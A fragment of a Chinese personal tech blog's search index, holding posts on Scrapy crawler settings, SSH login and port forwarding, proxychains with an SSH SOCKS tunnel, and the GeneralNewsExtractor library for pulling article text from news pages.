class="line">AUTOTHROTTLE_ENABLED &#x3D; True</span><br><span class="line">#起始的延迟</span><br><span class="line">AUTOTHROTTLE_START_DELAY &#x3D; 5</span><br><span class="line">#最小延迟</span><br><span class="line">DOWNLOAD_DELAY &#x3D; 3</span><br><span class="line">#最大延迟</span><br><span class="line">AUTOTHROTTLE_MAX_DELAY &#x3D; 10</span><br><span class="line">#每秒并发请求数的平均值，不能高于 CONCURRENT_REQUESTS_PER_DOMAIN或CONCURRENT_REQUESTS_PER_IP，调高了则吞吐量增大强奸目标站点，调低了则对目标站点更加”礼貌“</span><br><span class="line">#每个特定的时间点，scrapy并发请求的数目都可能高于或低于该值，这是爬虫视图达到的建议值而不是硬限制</span><br><span class="line">AUTOTHROTTLE_TARGET_CONCURRENCY &#x3D; 16.0</span><br><span class="line">#调试</span><br><span class="line">AUTOTHROTTLE_DEBUG &#x3D; True</span><br><span class="line">CONCURRENT_REQUESTS_PER_DOMAIN &#x3D; 16</span><br><span class="line">CONCURRENT_REQUESTS_PER_IP &#x3D; 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#&#x3D;&#x3D;&#x3D;&gt;第四部分：爬取深度与爬取方式&lt;&#x3D;&#x3D;&#x3D;</span><br><span class="line">#1、爬虫允许的最大深度，可以通过meta查看当前深度；0表示无深度</span><br><span class="line"># DEPTH_LIMIT &#x3D; 3</span><br><span class="line"></span><br><span class="line">#2、爬取时，0表示深度优先Lifo(默认)；1表示广度优先FiFo</span><br><span class="line"></span><br><span class="line"># 后进先出，深度优先</span><br><span class="line"># DEPTH_PRIORITY &#x3D; 0</span><br><span class="line"># SCHEDULER_DISK_QUEUE &#x3D; &#39;scrapy.squeue.PickleLifoDiskQueue&#39;</span><br><span class="line"># SCHEDULER_MEMORY_QUEUE &#x3D; &#39;scrapy.squeue.LifoMemoryQueue&#39;</span><br><span class="line"># 先进先出，广度优先</span><br><span class="line"></span><br><span class="line"># DEPTH_PRIORITY &#x3D; 1</span><br><span class="line"># SCHEDULER_DISK_QUEUE &#x3D; &#39;scrapy.squeue.PickleFifoDiskQueue&#39;</span><br><span class="line"># SCHEDULER_MEMORY_QUEUE &#x3D; &#39;scrapy.squeue.FifoMemoryQueue&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#3、调度器队列</span><br><span class="line"># SCHEDULER &#x3D; &#39;scrapy.core.scheduler.Scheduler&#39;</span><br><span class="line"># from scrapy.core.scheduler import Scheduler</span><br><span class="line"></span><br><span class="line">#4、访问URL去重</span><br><span class="line"># DUPEFILTER_CLASS &#x3D; &#39;step8_king.duplication.RepeatUrl&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#&#x3D;&#x3D;&#x3D;&gt;第五部分：中间件、Pipelines、扩展&lt;&#x3D;&#x3D;&#x3D;</span><br><span class="line">#1、Enable or disable spider middlewares</span><br><span class="line"># See http:&#x2F;&#x2F;scrapy.readthedocs.org&#x2F;en&#x2F;latest&#x2F;topics&#x2F;spider-middleware.html</span><br><span class="line">#SPIDER_MIDDLEWARES &#x3D; &#123;</span><br><span class="line">#    &#39;Amazon.middlewares.AmazonSpiderMiddleware&#39;: 543,</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#2、Enable or disable downloader middlewares</span><br><span class="line"># See http:&#x2F;&#x2F;scrapy.readthedocs.org&#x2F;en&#x2F;latest&#x2F;topics&#x2F;downloader-middleware.html</span><br><span class="line">DOWNLOADER_MIDDLEWARES &#x3D; &#123;</span><br><span class="line">   # &#39;Amazon.middlewares.DownMiddleware1&#39;: 543,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#3、Enable or disable extensions</span><br><span class="line"># See http:&#x2F;&#x2F;scrapy.readthedocs.org&#x2F;en&#x2F;latest&#x2F;topics&#x2F;extensions.html</span><br><span class="line">#EXTENSIONS &#x3D; &#123;</span><br><span class="line">#    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#4、Configure item pipelines</span><br><span class="line"># See http:&#x2F;&#x2F;scrapy.readthedocs.org&#x2F;en&#x2F;latest&#x2F;topics&#x2F;item-pipeline.html</span><br><span class="line">ITEM_PIPELINES &#x3D; &#123;</span><br><span class="line">   # &#39;Amazon.pipelines.CustomPipeline&#39;: 200,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#&#x3D;&#x3D;&#x3D;&gt;第六部分：缓存&lt;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">1. 启用缓存</span><br><span class="line">    目的用于将已经发送的请求或相应缓存下来，以便以后使用</span><br><span class="line">    </span><br><span class="line">    from scrapy.downloadermiddlewares.httpcache import HttpCacheMiddleware</span><br><span class="line">    from scrapy.extensions.httpcache import DummyPolicy</span><br><span class="line">    from scrapy.extensions.httpcache import FilesystemCacheStorage</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># 是否启用缓存策略</span><br><span class="line"># HTTPCACHE_ENABLED &#x3D; True</span><br><span class="line"></span><br><span class="line"># 缓存策略：所有请求均缓存，下次在请求直接访问原来的缓存即可</span><br><span class="line"># HTTPCACHE_POLICY &#x3D; &quot;scrapy.extensions.httpcache.DummyPolicy&quot;</span><br><span class="line"># 缓存策略：根据Http响应头：Cache-Control、Last-Modified 等进行缓存的策略</span><br><span class="line"># HTTPCACHE_POLICY &#x3D; &quot;scrapy.extensions.httpcache.RFC2616Policy&quot;</span><br><span class="line"></span><br><span class="line"># 缓存超时时间</span><br><span class="line"># HTTPCACHE_EXPIRATION_SECS &#x3D; 0</span><br><span class="line"></span><br><span class="line"># 缓存保存路径</span><br><span class="line"># HTTPCACHE_DIR &#x3D; &#39;httpcache&#39;</span><br><span class="line"></span><br><span class="line"># 缓存忽略的Http状态码</span><br><span class="line"># HTTPCACHE_IGNORE_HTTP_CODES &#x3D; []</span><br><span class="line"></span><br><span class="line"># 缓存存储的插件</span><br><span class="line"># HTTPCACHE_STORAGE &#x3D; &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH原理与应用</title>
      <link href="2020/03/27/2020-03-27-SSH_Principle_and_application/"/>
      <url>2020/03/27/2020-03-27-SSH_Principle_and_application/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH原理与应用"><a href="#SSH原理与应用" class="headerlink" title="SSH原理与应用"></a>SSH原理与应用</h1><p>[TOC]</p><p>本篇文章转自阮一峰博客<a href="http://www.ruanyifeng.com/">http://www.ruanyifeng.com</a></p><h3 id="ssh是什么？"><a href="#ssh是什么？" class="headerlink" title="ssh是什么？"></a>ssh是什么？</h3><p>简单说，SSH是一种网络协议，用于计算机之间的加密登录。如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。需要指出的是，SSH只是一种协议，存在多种实现，既有商业实现，也有开源实现。本文针对的实现是OpenSSH，它是自由软件，应用非常广泛。此外，本文只讨论SSH在Linux Shell中的用法。如果要在Windows系统中使用SSH，会用到另一种软件PuTTY，这需要另文介绍。</p><h3 id="ssh基本用法"><a href="#ssh基本用法" class="headerlink" title="ssh基本用法"></a>ssh基本用法</h3><p>SSH主要用于远程登录。假定你要以用户名user，登录远程主机host，只要一条简单命令就可以了。</p><pre><code>　　$ ssh user@host</code></pre><p>如果本地用户名与远程用户名一致，登录时可以省略用户名。</p><pre><code>　　$ ssh host</code></pre><p>SSH的默认端口是22，也就是说，你的登录请求会送进远程主机的22端口。使用p参数，可以修改这个端口。下面这条命令表示，ssh直接连接远程主机的2222端口。</p><pre><code>　　$ ssh -p 2222 user@host</code></pre><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>SSH之所以能够保证安全，原因在于它采用了公钥加密。</p><p>整个过程是这样的：（1）远程主机收到用户的登录请求，把自己的公钥发给用户。（2）用户使用这个公钥，将登录密码加密后，发送回来。（3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。</p><p>这个过程本身是安全的，但是实施的时候存在一个风险：如果有人截获了登录请求，然后冒充远程主机，将伪造的公钥发给用户，那么用户很难辨别真伪。因为不像https协议，SSH协议的公钥是没有证书中心（CA）公证的，也就是说，都是自己签发的。</p><p>可以设想，如果攻击者插在用户与远程主机之间（比如在公共的wifi区域），用伪造的公钥，获取用户的登录密码。再用这个密码登录远程主机，那么SSH的安全机制就荡然无存了。这种风险就是著名的”中间人攻击”（Man-in-the-middle attack）。</p><p>SSH协议是如何应对的呢？</p><h3 id="口令登录"><a href="#口令登录" class="headerlink" title="口令登录"></a>口令登录</h3><p>如果你是第一次登录对方主机，系统会出现下面的提示：</p><pre><code>　　$ ssh user@host　　The authenticity of host &#39;host (12.18.429.21)&#39; can&#39;t be established.　　RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.　　Are you sure you want to continue connecting (yes/no)?</code></pre><p>这段话的意思是，无法确认host主机的真实性，只知道它的公钥指纹，问你还想继续连接吗？</p><p>所谓”公钥指纹”，是指公钥长度较长（这里采用RSA算法，长达1024位），很难比对，所以对其进行MD5计算，将它变成一个128位的指纹。上例中是98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d，再进行比较，就容易多了。</p><p>很自然的一个问题就是，用户怎么知道远程主机的公钥指纹应该是多少？回答是没有好办法，远程主机必须在自己的网站上贴出公钥指纹，以便用户自行核对。</p><p>假定经过风险衡量以后，用户决定接受这个远程主机的公钥。</p><pre><code>　　Are you sure you want to continue connecting (yes/no)? yes</code></pre><p>系统会出现一句提示，表示host主机已经得到认可。</p><pre><code>　　Warning: Permanently added &#39;host,12.18.429.21&#39; (RSA) to the list of known hosts.</code></pre><p>然后，会要求输入密码。</p><pre><code>　　Password: (enter password)</code></pre><p>如果密码正确，就可以登录了。</p><p>当远程主机的公钥被接受以后，它就会被保存在文件$HOME/.ssh/known_hosts之中。下次再连接这台主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p><p>每个SSH用户都有自己的known_hosts文件，此外系统也有一个这样的文件，通常是/etc/ssh/ssh_known_hosts，保存一些对所有用户都可信赖的远程主机的公钥。</p><h3 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h3><p>使用密码登录，每次都必须输入密码，非常麻烦。好在SSH还提供了公钥登录，可以省去输入密码的步骤。</p><p>所谓”公钥登录”，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。</p><p>这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用ssh-keygen生成一个：</p><pre><code>　　$ ssh-keygen</code></pre><p>运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。</p><p>运行结束以后，在$HOME/.ssh/目录下，会新生成两个文件：id_rsa.pub和id_rsa。前者是你的公钥，后者是你的私钥。</p><p>这时再输入下面的命令，将公钥传送到远程主机host上面：</p><pre><code>　　$ ssh-copy-id user@host</code></pre><p>好了，从此你再登录，就不需要输入密码了。</p><p>如果还是不行，就打开远程主机的/etc/ssh/sshd_config这个文件，检查下面几行前面”#”注释是否取掉。</p><pre><code>　　RSAAuthentication yes　　PubkeyAuthentication yes　　AuthorizedKeysFile .ssh/authorized_keys</code></pre><p>然后，重启远程主机的ssh服务。</p><pre><code>　　// ubuntu系统　　service ssh restart　　// debian系统　　/etc/init.d/ssh restart</code></pre><h3 id="authorized-keys文件"><a href="#authorized-keys文件" class="headerlink" title="authorized_keys文件"></a>authorized_keys文件</h3><p>远程主机将用户的公钥，保存在登录后的用户主目录的$HOME/.ssh/authorized_keys文件中。公钥就是一段字符串，只要把它追加在authorized_keys文件的末尾就行了。</p><p>这里不使用上面的ssh-copy-id命令，改用下面的命令，解释公钥的保存过程：</p><pre><code>　　$ ssh user@host &#39;mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub</code></pre><p>这条命令由多个语句组成，依次分解开来看：（1）”$ ssh user@host”，表示登录远程主机；（2）单引号中的mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys，表示登录后在远程shell上执行的命令：（3）”$ mkdir -p .ssh”的作用是，如果用户主目录中的.ssh目录不存在，就创建一个；（4）’cat &gt;&gt; .ssh/authorized_keys’ &lt; <del>/.ssh/id_rsa.pub的作用是，将本地的公钥文件</del>/.ssh/id_rsa.pub，重定向追加到远程文件authorized_keys的末尾。</p><p>写入authorized_keys文件后，公钥登录的设置就完成了。</p><h3 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h3><p>SSH不仅可以用于远程主机登录，还可以直接在远程主机上执行操作。</p><p>上面写入公钥就是一个例子：</p><pre><code>　　$ ssh user@host &#39;mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub</code></pre><p>单引号中间的部分，表示在远程主机上执行的操作；后面的输入重定向，表示数据通过SSH传向远程主机。</p><p>这就是说，SSH可以在用户和远程主机之间，建立命令和数据的传输通道，因此很多事情都可以通过SSH来完成。</p><p>下面看几个例子。</p><p>【例1】</p><p>将$HOME/src/目录下面的所有文件，复制到远程主机的$HOME/src/目录。</p><pre><code>　　$ cd &amp;&amp; tar czv src | ssh user@host &#39;tar xz&#39;</code></pre><p>【例2】</p><p>将远程主机$HOME/src/目录下面的所有文件，复制到用户的当前目录。</p><pre><code>　　$ ssh user@host &#39;tar cz src&#39; | tar xzv</code></pre><p>【例3】</p><p>查看远程主机是否运行进程httpd。</p><pre><code>　　$ ssh user@host &#39;ps ax | grep [h]ttpd&#39;</code></pre><h3 id="绑定本地端口"><a href="#绑定本地端口" class="headerlink" title="绑定本地端口"></a>绑定本地端口</h3><p>既然SSH可以传送数据，那么我们可以让那些不加密的网络连接，全部改走SSH连接，从而提高安全性。</p><p>假定我们要让8080端口的数据，都通过SSH传向远程主机，命令就这样写：</p><pre><code>　　$ ssh -D 8080 user@host</code></pre><p>SSH会建立一个socket，去监听本地的8080端口。一旦有数据传向那个端口，就自动把它转移到SSH连接上面，发往远程主机。可以想象，如果8080端口原来是一个不加密端口，现在将变成一个加密端口。</p><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p>有时，绑定本地端口还不够，还必须指定数据传送的目标主机，从而形成点对点的”端口转发”。为了区别后文的”远程端口转发”，我们把这种情况称为”本地端口转发”（Local forwarding）。</p><p>假定host1是本地主机，host2是远程主机。由于种种原因，这两台主机之间无法连通。但是，另外还有一台host3，可以同时连通前面两台主机。因此，很自然的想法就是，通过host3，将host1连上host2。</p><p>我们在host1执行下面的命令：</p><pre><code>　　$ ssh -L 2121:host2:21 host3</code></pre><p>命令中的L参数一共接受三个值，分别是”本地端口:目标主机:目标主机端口”，它们之间用冒号分隔。这条命令的意思，就是指定SSH绑定本地端口2121，然后指定host3将所有的数据，转发到目标主机host2的21端口（假定host2运行FTP，默认端口为21）。</p><p>这样一来，我们只要连接host1的2121端口，就等于连上了host2的21端口。</p><pre><code>　　$ ftp localhost:2121</code></pre><p>“本地端口转发”使得host1和host3之间仿佛形成一个数据传输的秘密隧道，因此又被称为”<strong>SSH隧道</strong>“。</p><p>下面是一个比较有趣的例子。</p><pre><code>　　$ ssh -L 5900:localhost:5900 host3</code></pre><p>它表示将本机的5900端口绑定host3的5900端口（这里的localhost指的是host3，因为目标主机是相对host3而言的）。</p><p>另一个例子是通过host3的端口转发，ssh登录host2。</p><pre><code>　　$ ssh -L 9001:host2:22 host3</code></pre><p>这时，只要ssh登录本机的9001端口，就相当于登录host2了。</p><pre><code>　　$ ssh -p 9001 localhost</code></pre><p>上面的-p参数表示指定登录端口。</p><h3 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h3><p>既然”本地端口转发”是指绑定本地端口的转发，那么”远程端口转发”（remote forwarding）当然是指绑定远程端口的转发。</p><p>还是接着看上面那个例子，host1与host2之间无法连通，必须借助host3转发。但是，特殊情况出现了，host3是一台内网机器，它可以连接外网的host1，但是反过来就不行，外网的host1连不上内网的host3。这时，”本地端口转发”就不能用了，怎么办？</p><p>解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了。</p><p>我们在host3执行下面的命令：</p><pre><code>　　$ ssh -R 2121:host2:21 host1</code></pre><p>R参数也是接受三个值，分别是”远程主机端口:目标主机:目标主机端口”。这条命令的意思，就是让host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。由于对于host3来说，host1是远程主机，所以这种情况就被称为”远程端口绑定”。</p><p>绑定之后，我们在host1就可以连接host2了：</p><pre><code>　　$ ftp localhost:2121</code></pre><p>这里必须指出，”远程端口转发”的前提条件是，host1和host3两台主机都有sshD和ssh客户端。</p><h3 id="SSH的其他参数"><a href="#SSH的其他参数" class="headerlink" title="SSH的其他参数"></a>SSH的其他参数</h3><p>SSH还有一些别的参数，也值得介绍。</p><p>N参数，表示只连接远程主机，不打开远程shell；T参数，表示不为这个连接分配TTY。这个两个参数可以放在一起用，代表这个SSH连接只用来传数据，不执行远程操作。</p><pre><code>　　$ ssh -NT -D 8080 host</code></pre><p>f参数，表示SSH连接成功后，转入后台运行。这样一来，你就可以在不中断SSH连接的情况下，在本地shell中执行其他操作。要关闭这个后台连接，就只有用kill命令去杀掉进程。</p><pre><code>　　$ ssh -f -D 8080 host</code></pre><p>还可以设置一些参数保持ssh隧道连接，每60秒发送一个KeepAlive请求，保证终端不会因为超时空闲而断开连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　$ ssh -Nf -D 8080 host -o TCPKeepAlive&#x3D;yes -o ServerALiveInterval&#x3D;60</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu科学上网（ssh + proxychains）</title>
      <link href="2020/03/26/2020-03-26-ubuntu_ssh_proxychains/"/>
      <url>2020/03/26/2020-03-26-ubuntu_ssh_proxychains/</url>
      
        <content type="html"><![CDATA[<h1 id="ubuntu科学上网（ssh-proxychains）"><a href="#ubuntu科学上网（ssh-proxychains）" class="headerlink" title="ubuntu科学上网（ssh + proxychains）"></a>ubuntu科学上网（ssh + proxychains）</h1><p>[TOC]</p><p>本文主要讲解proxychains，以及如何结合ssh隧道科学上网。</p><h3 id="proxychains是什么？"><a href="#proxychains是什么？" class="headerlink" title="proxychains是什么？"></a>proxychains是什么？</h3><p>proxychains可以在原命令前面另加一个代理程序来运行该命令, 从而使得本来不能配置运行代理的程序可以使用代理运行。该程序原理是通过和网络相关libc动态相关库的函数进行绑定(hook), 使这些函数走一个预加载的动态库并重定向链接。因为这个工作原理, 他只能对动态连接的程序起效(就是调用动态库的), 另外proxychains和被代理程序需要调用同一个动态连接库。</p><h3 id="项目地址："><a href="#项目地址：" class="headerlink" title="项目地址："></a>项目地址：</h3><p><a href="https://github.com/haad/proxychains">https://github.com/haad/proxychains</a></p><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br></pre></td></tr></table></figure><h3 id="配置文件："><a href="#配置文件：" class="headerlink" title="配置文件："></a>配置文件：</h3><p> /etc/proxychains.conf</p><h3 id="代理模式："><a href="#代理模式：" class="headerlink" title="代理模式："></a>代理模式：</h3><p>代理模式在配置文件最开头, 有四种模式供选择, 关闭某模式就是注释掉就可以了。默认是选择的strict_chain，一般我们不用多个代理造成链, 只要一个就好了, 所以一般不改变代理模式部分。</p><ul><li>dynamic_chain，按照列表中出现的代理服务器的先后顺序组成一条链，如果有代理服务器失效，则自动将其排除，但至少要有一个是有效的。</li><li>strict_chain，按照后面列表中出现的代理服务器的先后顺序组成一条链，要求所有的代理服务器都是有效的</li><li>round_robin_chain, 类似dynamic_chain, 但是只读取chain_len 长度</li><li>random_chain，列表中的任何一个代理服务器都可能被选择使用，这种方式很适合网络扫描操作（参数chain_len对random_chain有效）。</li></ul><h3 id="配置代理服务器："><a href="#配置代理服务器：" class="headerlink" title="配置代理服务器："></a>配置代理服务器：</h3><p>在最下面的部分就是代理服务器列表配置了, 支持HTTP, SOCKS4, SOCKS5, 貌似新版本还支持HTTPS。例如:对于SS代理, 在最后一行加入这句话 socks5 127.0.0.1 1080</p><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><p>结合ssh隧道，我们可以通过谷歌浏览器<strong>科学上网</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -Nf -D 1080 用户@服务器</span><br><span class="line">proxychains google-chrome</span><br></pre></td></tr></table></figure><p>其中N参数，表示只连接远程主机，不打开远程shell；f参数，表示SSH连接成功后，转入后台运行；D参数。表示绑定本地端口，让1080端口的数据，都通过SSH传向远程主机。如果有关于ssh的问题，以及了解ssh的原理和运用，大家可以参考阮一峰博客两篇文章：</p><p><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></p><p><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html">http://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> ssh </tag>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新闻网页正文通用抽取器GeneralNewsExtractor</title>
      <link href="2020/03/25/2020-03-25-Universal_extractor_for_news_webpage_text_GeneralNewsExtractor/"/>
      <url>2020/03/25/2020-03-25-Universal_extractor_for_news_webpage_text_GeneralNewsExtractor/</url>
      
        <content type="html"><![CDATA[<h1 id="新闻网页正文通用抽取器GeneralNewsExtractor"><a href="#新闻网页正文通用抽取器GeneralNewsExtractor" class="headerlink" title="新闻网页正文通用抽取器GeneralNewsExtractor"></a>新闻网页正文通用抽取器GeneralNewsExtractor</h1><p>GeneralNewsExtractor简称GNE，是Github上kingname根据论文《基于文本及符号密度的网页正文提取方法》制作的新闻网页正文通用抽取器。据说正确率可以达到99%。</p><p>github地址：<a href="https://github.com/kingname/GeneralNewsExtractor">https://github.com/kingname/GeneralNewsExtractor</a></p><p>参考论文地址：<a href="https://kns.cnki.net/KCMS/detail/detail.aspx?dbcode=CJFQ&amp;dbname=CJFDLAST2019&amp;filename=GWDZ201908029&amp;v=MDY4MTRxVHJXTTFGckNVUkxPZmJ1Wm5GQ2poVXJyQklqclBkTEc0SDlqTXA0OUhiWVI4ZVgxTHV4WVM3RGgxVDM=">https://kns.cnki.net/KCMS/detail/detail.aspx?dbcode=CJFQ&amp;dbname=CJFDLAST2019&amp;filename=GWDZ201908029&amp;v=MDY4MTRxVHJXTTFGckNVUkxPZmJ1Wm5GQ2poVXJyQklqclBkTEc0SDlqTXA0OUhiWVI4ZVgxTHV4WVM3RGgxVDM=</a></p><p>在论文中描述的正文提取基础上，作者增加了标题、发布时间和文章作者的自动化探测与提取功能。输入是 HTML（自行使用恰当的方法获取目标网站的 HTML），输出是一个字典。不足是没有保持原有的段落布局。</p><h3 id="安装-GNE"><a href="#安装-GNE" class="headerlink" title="安装 GNE"></a>安装 GNE</h3><p>pip install –upgrade gne</p><h3 id="使用-GNE"><a href="#使用-GNE" class="headerlink" title="使用 GNE"></a>使用 GNE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gne <span class="keyword">import</span> GeneralNewsExtractor</span><br><span class="line">html = <span class="string">&#x27;&#x27;&#x27;经过渲染的网页 HTML 代码&#x27;&#x27;&#x27;</span></span><br><span class="line">extractor = GeneralNewsExtractor()</span><br><span class="line">result = extractor.extract(html, noise_node_list=[<span class="string">&#x27;//div[@class=&quot;comment-list&quot;]&#x27;</span>])</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;title&quot;: &quot;xxxx&quot;, &quot;publish_time&quot;: &quot;2019-09-10 11:12:13&quot;, &quot;author&quot;: &quot;yyy&quot;, &quot;content&quot;: &quot;zzzz&quot;, &quot;images&quot;: [&quot;&#x2F;xxx.jpg&quot;, &quot;&#x2F;yyy.png&quot;]&#125;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *-* coding:utf-8 *-*</span></span><br><span class="line"><span class="keyword">from</span> gne <span class="keyword">import</span> GeneralNewsExtractor</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;www.cnvd.org.cn&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.cnvd.org.cn/webinfo/list?type=1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;https://www.cnvd.org.cn/webinfo/show/4653&#x27;</span></span><br><span class="line">html = requests.get(url,headers=headers).text</span><br><span class="line">extractor = GeneralNewsExtractor()</span><br><span class="line">result = extractor.extract(html)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;title&#39;: &#39;国家信息安全漏洞共享平台&#39;, &#39;author&#39;: &#39;CNVD&#39;, &#39;publish_time&#39;: &#39;2018-08-27 15:52:06&#39;, &#39;content&#39;: &#39;VBScript可在Windows和IE 11最新版本上使用。不过微软在浏览器的默认设置中禁用了Windows最新版本中的VBScript执行，以解决该漏洞。尽管如此，但还存在加载脚本的其它方法。例如，Office 组件中的应用依靠 IE 引擎加载并渲染 web 内容。\n安全研究员早在微软于7月份交付 Windows 常规更新一天后就注意到这个 VBScript 漏洞遭利用。该漏洞的 CVE 编号是 CVE-2018-8373，已在本月的补丁日修复。它是一个使用后释放内存破坏漏洞，能让攻击者在受攻陷计算机上运行 shellcode。\n参考链接：\nhttps:&#x2F;&#x2F;www.bleepingcomputer.com&#x2F;news&#x2F;security&#x2F;zero-day-in-microsofts-vbscript-engine-used-by-darkhotel-apt&#x2F;\n（编辑：CNVD）\xa0|\n已有0条评论&#39;, &#39;images&#39;: [&#39;&#x2F;images&#x2F;pinglun.png&#39;]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现title错误，但GNE支持修改解析。自动提取失败了，你可以指定 <strong>Title XPath</strong>。例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = extractor.extract(html,title_xpath=<span class="string">&#x27;//h1/text()&#x27;</span>)</span><br></pre></td></tr></table></figure><p>结果的title就可以正确解析为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;title&#39;: &#39;微软VBScirpt引擎中的0day漏洞遭Darkhotel APT利用&#39;, &#39;author&#39;: &#39;CNVD&#39;, &#39;publish_time&#39;: &#39;2018-08-27 15:52:06&#39;, &#39;content&#39;: &#39;VBScript可在Windows和IE 11最新版本上使用。不过微软在浏览器的默认设置中禁用了Windows最新版本中的VBScript执行，以解决该漏洞。尽管如此，但还存在加载脚本的其它方法。例如，Office 组件中的应用依靠 IE 引擎加载并渲染 web 